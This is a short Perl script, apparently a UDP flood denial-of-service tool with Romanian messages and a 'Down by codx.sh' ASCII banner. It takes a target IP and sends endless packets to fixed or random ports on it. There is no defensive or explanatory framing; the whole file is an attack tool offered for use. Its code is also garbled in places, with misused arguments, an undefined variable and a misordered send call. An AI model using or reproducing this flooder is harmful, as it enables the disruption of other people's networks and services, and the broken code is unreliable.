


#!/usr/bin/perl
use Socket;
$ARGC=@ARGV;
my ($ip,$port,$size,$time);
if ($ARGC !=1) {
printf "Comanda este: perl codx.sh ip\n";
exit(1);
}
$ip=$ARGV[0];
$port=$ARGV[0];
$time=$ARGV[0];
socket(crazy, PF_INET, SOCK_DGRAM, 17);
$iaddr = inet_aton("$ip");

printf "[1;31m
Incepem...
\n";
printf "[1;32mΞ ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ Ξ\n";  
printf "[1;34mΞ[1;32m╔╦╗┌─┐╦ ╦┌┐┌             Ξ\n";
printf "[1;34mΞ[1;32m ║║│ │║║║│││             Ξ\n";
printf "[1;34mΞ[1;32m═╩╝└─┘╚╩╝┘└┘             Ξ\n";
printf "[1;37mΞ    ┌┐ ┬ ┬                     Ξ\n";
printf "[1;37mΞ    ├┴┐└┬┘                     Ξ\n";
printf "[1;37mΞ    └─┘ ┴                      Ξ\n";
printf "[0;35mΞ      ┌─┐┌─┐┌┬┐─┐ ┬ ┌─┐┬ ┬     Ξ\n";
printf "[0;35mΞ      │  │ │ ││┌┴┬┘ └─┐├─┤     Ξ\n";
printf "[0;35mΞ      └─┘└─┘─┴┘┴ └─♥└─┘┴ ┴     Ξ\n";
printf "[1;32mΞ ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ Ξ\n";
printf "[1;34m 
Pentru a opri SPAMEAZA CTRL C ;)
\n";

if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto randpackets;
}
packets:
for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 30000, $size, sockaddr_in($port, $iaddr));
}
randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=int(rand 92990) +0;
send(crazy, 30000, $size, sockaddr_in($port, $iaddr));
}